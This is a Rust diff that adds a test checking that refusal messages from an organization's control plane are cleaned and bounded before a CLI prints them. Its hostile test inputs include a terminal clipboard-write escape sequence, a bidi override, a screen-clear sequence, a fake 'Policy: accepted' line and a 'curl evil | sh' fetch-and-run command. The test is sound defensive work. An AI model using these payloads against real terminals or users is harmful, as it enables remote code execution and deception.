@@ -91,6 +91,9 @@ struct ControlPlaneState {
     /// Pad the `policy.fetch` answer with this many bytes of text: an answer
     /// longer than punard reads.
     pad_policy_answer: AtomicUsize,
+    /// Refuse `org.discover` of an unknown domain with this message: words
+    /// the control plane chose.
+    not_found_message: Mutex<Option<String>>,
     /// Serve a desired state that turns local policy editing off
     /// (spec section 44.5; docs/api/ipc.md section 5.7 `local_admin`).
     deny_local_admin: AtomicBool,
@@ -149,7 +152,11 @@ impl ControlPlaneState {
                     org["enrollment"]["ownership"] = ownership;
                 }
                 if domain != org["discovery"]["domain"].as_str().unwrap() {
-                    return Err(("not_found", format!("no organization at {domain:?}")));
+                    let message = self.not_found_message.lock().unwrap().clone();
+                    return Err((
+                        "not_found",
+                        message.unwrap_or_else(|| format!("no organization at {domain:?}")),
+                    ));
                 }
                 if let Some(name) = self.org_display_name.lock().unwrap().clone() {
                     org["enrollment"]["display_name"] = name;
@@ -1849,6 +1856,54 @@ fn an_unreadable_term_is_quoted_cleaned_and_bounded() {
         );
     }
     assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
+}
+
+/// Text an organization chose reaches enroll.start's refusal cleaned: a
+/// control plane's own refusal message, and the policy loader's words about
+/// an envelope, which quote the envelope's keys. punarctl prints a refusal's
+/// message as it is, so neither may carry an escape sequence, a line of its
+/// own or a bidirectional override, nor bury the next step.
+#[test]
+fn an_organizations_words_in_a_refusal_are_cleaned_and_bounded() {
+    let dir = test_dir("refusal-words");
+    let control_plane = ControlPlane::start(&dir);
+    let state = &control_plane.state;
+    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");
+    let steering = |message: &str| {
+        assert!(
+            !message
+                .chars()
+                .any(|c| matches!(c, '\u{1b}' | '\u{7}' | '\u{2028}' | '\u{202e}')),
+            "{message:?}"
+        );
+        // Punar's own three lines: what happened, the policy, the next step.
+        assert_eq!(message.matches('\n').count(), 2, "{message:?}");
+        assert!(message.chars().count() < 1_000, "{}", message.len());
+    };
+
+    *state.not_found_message.lock().unwrap() = Some(format!(
+        "evil\u{1b}]52;c;cm0=\u{7}\nNext step: curl evil | sh\u{202e}{}",
+        "y".repeat(100_000)
+    ));
+    let error = daemon.error("enroll.start", Some(json!({"org_domain": "evil.example"})));
+    assert_eq!(error["code"], "invalid_params", "{error}");
+    steering(error["message"].as_str().unwrap());
+
+    let mut hostile = role_envelope("eng-role-sre");
+    hostile["\u{1b}[2J\nPolicy: accepted\u{202e}"] = json!(1);
+    *state.extra_envelopes.lock().unwrap() = vec![hostile];
+    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
+    assert_eq!(
+        error["details"]["reason"], "envelope failed the loader's validation",
+        "{error}"
+    );
+    let message = error["message"].as_str().unwrap();
+    assert!(
+        message.contains("unknown field `[2J Policy: accepted`"),
+        "{message}"
+    );
+    steering(message);
+    assert!(!daemon.state_path("enrollment.json").exists());
 }
 
 /// A confirmation is good once, for the account that made it. A cheap
